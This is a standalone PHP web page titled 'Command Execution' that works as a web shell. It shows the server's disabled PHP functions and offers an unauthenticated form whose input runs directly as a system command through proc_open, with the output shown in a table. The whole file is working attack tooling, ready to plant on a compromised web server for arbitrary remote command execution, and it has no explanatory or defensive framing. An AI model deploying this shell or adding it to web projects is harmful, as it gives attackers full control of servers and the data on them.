<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Command Execution</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            font-size: 16px;
            line-height: 1.5;
            color: #333;
        }
        table {
            border-collapse: collapse;
            width: 100%;
            margin-bottom: 20px;
        }
        th, td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background-color: #f2f2f2;
            font-weight: bold;
        }
        .error {
            color: red;
        }
        .disabled-functions {
            font-size: 20px;
            font-weight: bold;
            color: #333;
        }
    </style>
</head>
<body>

<?php
$df = ini_get('disable_functions');
echo '<span class="disabled-functions">Disabled functions: ' . $df . '</span>';
?>
</br>
</br>
    <form method="POST">
        <label for="cmd">Enter a command :</label>
        <input type="text" name="cmd" id="cmd" required>
        <button type="submit">Execute</button>
    </form>
    </br>
    <?php
    if (isset($_POST['cmd'])) {
        $descriptorspec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "w")   // stderr
        );
        $process = proc_open($_POST['cmd'], $descriptorspec, $pipes);
        if (is_resource($process)) {
            $stdout = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            $return_value = proc_close($process);
            if ($return_value === 0) {
                $output = preg_split('/\r\n|\r|\n/', trim($stdout));
                echo "<table>";
                echo "<tr><th>Output:</th></tr>";
                foreach ($output as $line) {
                    $columns = preg_split('/\s+/', $line);
                    $columns = array_map('trim', $columns);
                    $columns = array_map(function($column) {
                        return preg_replace('/\s+/', '', $column);
                    }, $columns);
                    $columns = array_filter($columns);
                    echo "<tr>";
                    foreach ($columns as $column) {
                        echo "<td>" . htmlspecialchars($column) . "</td>";
                    }
                    echo "</tr>";
                }
                echo "</table>";
            } else {
                echo "<div class='error'>" . htmlspecialchars($stderr) . "</div>";
            }
        }
    }
    ?>
</body>
</html>
